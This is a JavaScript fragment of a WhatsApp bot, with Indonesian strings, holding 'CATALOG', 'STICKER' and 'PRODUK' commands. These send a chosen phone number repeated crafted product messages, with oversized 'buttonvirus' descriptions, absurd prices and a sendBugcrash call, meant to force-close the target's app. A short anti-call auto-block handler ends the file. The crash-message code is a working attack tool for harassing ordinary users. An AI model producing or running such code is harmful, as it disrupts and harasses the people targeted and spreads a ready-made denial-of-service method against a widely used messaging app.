CATALOG :
{
    if (!isGroup) return apbotwhatsapp.reply('Khusus Member Group Gw Coy')
    if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
    jumlah = '10'
    waktu = '4s'
    for (let i = 0; i < jumlah; i++) {
    var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: ap.waUploadToServer })
    var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
    "productMessage": {
    "product": {
    "productImage": messa.imageMessage,
    "productId": "7091718154232528",
    "title": `MAMPUS FC CHUAKS`,
    "description": `${buttonvirus}${buttonvirus}`,
    "currencyCode": "IDR",
    "priceAmount1000": "100000000000000000",
    "productImageCount": 1,
    "firstImageId": 1,
    "salePriceAmount1000": "1000",
    "retailerId": `Nomor Owner Di Atas`,
    "url": `https://wa.me/0`
    },
    "businessOwnerJid": "6281226416919@s.whatsapp.net",
    }
    }), { userJid: from, quoted: lep  })
    ap.relayMessage(num, catalog.message, { messageId: catalog.key.id })
    await sleep(ms(waktu))
    }
    apbotwhatsapp.reply(`SUKSES KIRIM JAN LUPA JEDANYA KONTOL`)
    }

    STICKER : 
    {
        if (!isGroup) return apbotwhatsapp.reply('Khusus Member Group Gw Coy')
        if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
         jumlah = '2'
        waktu = '3s'
        for (let i = 0; i < jumlah; i++) {
        ap.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
        await sleep(ms(waktu))
        }
        }
         PRODUK :
         {
            if (!isGroup) return apbotwhatsapp.reply('Khusus Member Group Gw Coy')
            if (!q) return 
            num = `${q}`+'@s.whatsapp.net'
             jumlah = '2'
            waktu = '3s'
            for (let i = 0; i < jumlah; i++) {
            sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6283165001347@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
            await sleep(ms(waktu))
            }
            }
*// anticall
apbotwhatsapp.ws.on('CB:call', async (json) => {
    const callerId = json.content[0].attrs['call-creator']
    if (json.content[0].tag == 'offer') {
    let blockap = await apbotwhatsapp.sendContact(callerId, global.owner)
    apbotwhatsapp.sendMessage(callerId, { text: `*Automatic blocking system!*\n*Don't call bot*!\n*Please contact the owner to open block !*`}, { quoted : blockap })
    await sleep(8000)
    await apbotwhatsapp.updateBlockStatus(callerId, "block")
    }
    })